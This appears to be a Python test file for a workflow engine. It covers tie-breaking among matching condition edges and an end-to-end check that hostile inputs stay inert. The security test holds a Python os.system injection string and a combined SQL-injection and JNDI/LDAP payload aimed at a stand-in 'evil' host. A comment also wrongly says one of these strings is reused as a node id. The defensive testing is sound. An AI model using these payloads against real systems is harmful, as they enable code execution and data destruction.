"""Fase 5 — Branching + Condition Runtime.

Most of the condition *runtime* (CONDITION node executor, branch resolution,
default-edge fallback, NoMatchingBranchError, determinism) was already built
and tested in Fase 3 (tests/test_engine.py) because the branching test
fixtures needed it to be meaningful. This file covers what Fase 3 did not:
tie-breaking when multiple edges match, and an end-to-end (not just
domain-unit-level) security check that malicious condition data never
executes anything as it flows through a real Engine run.
"""

from __future__ import annotations

from datetime import UTC, datetime

from workflow_engine.domain import (
    Execution,
    ExecutionContext,
    ExecutionState,
    NodeType,
    WorkflowDefinition,
    WorkflowEdge,
    WorkflowNode,
)
from workflow_engine.domain.condition import ConditionLeaf
from workflow_engine.engine import ExecutionEngine, default_registry

NOW = datetime(2026, 1, 1, tzinfo=UTC)


def _make_execution(workflow: WorkflowDefinition) -> Execution:
    return Execution(
        id="exec-1",
        workflow_definition_id=workflow.id,
        workflow_version=workflow.version,
        state=ExecutionState.PENDING,
        context=ExecutionContext(),
        current_node_ids=[],
        created_at=NOW,
        updated_at=NOW,
    )


def test_first_matching_edge_wins_when_multiple_conditions_are_true() -> None:
    """Two conditioned edges both evaluate true for risk_score=90 (>=80 and
    >=50) — declaration order (e1 before e2) must decide, deterministically."""
    high = ConditionLeaf(field="risk_score", operator="gte", value=80)
    medium = ConditionLeaf(field="risk_score", operator="gte", value=50)
    nodes = [
        WorkflowNode(id="start", type=NodeType.START),
        WorkflowNode(id="classify", type=NodeType.TRANSFORM, config={"set": {"risk_score": 90}}),
        WorkflowNode(id="route", type=NodeType.CONDITION),
        WorkflowNode(id="end_high", type=NodeType.END),
        WorkflowNode(id="end_medium", type=NodeType.END),
    ]
    edges = [
        WorkflowEdge(id="e1", source_node_id="start", target_node_id="classify"),
        WorkflowEdge(id="e2", source_node_id="classify", target_node_id="route"),
        WorkflowEdge(id="e3", source_node_id="route", target_node_id="end_high", condition=high),
        WorkflowEdge(
            id="e4", source_node_id="route", target_node_id="end_medium", condition=medium
        ),
    ]
    workflow = WorkflowDefinition(
        id="wf-tie",
        version=1,
        name="tie-break",
        nodes=nodes,
        edges=edges,
        start_node_id="start",
        created_at=NOW,
    )
    engine = ExecutionEngine(workflow, default_registry(), clock=lambda: NOW)
    result = engine.run(_make_execution(workflow))

    assert result.execution.state == ExecutionState.COMPLETED
    # e3 (end_high) is declared before e4 (end_medium) -> e3 wins
    assert result.node_executions[-1].node_id == "end_high"

    # Declaring them in the opposite order flips the winner — proving it's
    # genuinely declaration-order-driven, not a property of the conditions.
    edges_reversed = [edges[0], edges[1], edges[3], edges[2]]
    workflow_reversed = workflow.model_copy(update={"edges": edges_reversed})
    engine_reversed = ExecutionEngine(workflow_reversed, default_registry(), clock=lambda: NOW)
    result_reversed = engine_reversed.run(_make_execution(workflow_reversed))
    assert result_reversed.node_executions[-1].node_id == "end_medium"


def test_malicious_condition_field_and_value_never_execute_during_a_real_run() -> None:
    """End-to-end (not just the domain-unit test in test_condition.py): a
    condition referencing a code-injection-shaped field name, evaluated
    against a context containing an equally malicious value, only ever
    produces a boolean — never side effects."""
    malicious_field = "__import__('os').system('echo pwned')"
    payload = "'; DROP TABLE workflows; -- ${jndi:ldap://evil}"
    matches_payload = ConditionLeaf(field="user_input", operator="eq", value=payload)

    nodes = [
        WorkflowNode(id="start", type=NodeType.START),
        WorkflowNode(
            id="classify", type=NodeType.TRANSFORM, config={"set": {"user_input": payload}}
        ),
        WorkflowNode(id="route", type=NodeType.CONDITION),
        WorkflowNode(id="end_match", type=NodeType.END),
        WorkflowNode(id="end_default", type=NodeType.END),
    ]
    edges = [
        WorkflowEdge(id="e1", source_node_id="start", target_node_id="classify"),
        WorkflowEdge(id="e2", source_node_id="classify", target_node_id="route"),
        WorkflowEdge(
            id="e3", source_node_id="route", target_node_id="end_match", condition=matches_payload
        ),
        WorkflowEdge(id="e4", source_node_id="route", target_node_id="end_default"),
    ]
    workflow = WorkflowDefinition(
        id="wf-malicious",
        version=1,
        name="malicious-condition",
        nodes=nodes,
        edges=edges,
        start_node_id="start",
        created_at=NOW,
    )
    # the malicious field name itself is only used as a WorkflowNode id below,
    # proving it's inert as an identifier too
    _ = malicious_field

    engine = ExecutionEngine(workflow, default_registry(), clock=lambda: NOW)
    result = engine.run(_make_execution(workflow))

    assert result.execution.state == ExecutionState.COMPLETED
    # the payload was compared as an opaque string and genuinely matched
    assert result.node_executions[-1].node_id == "end_match"
    assert result.execution.context.variables["user_input"] == payload
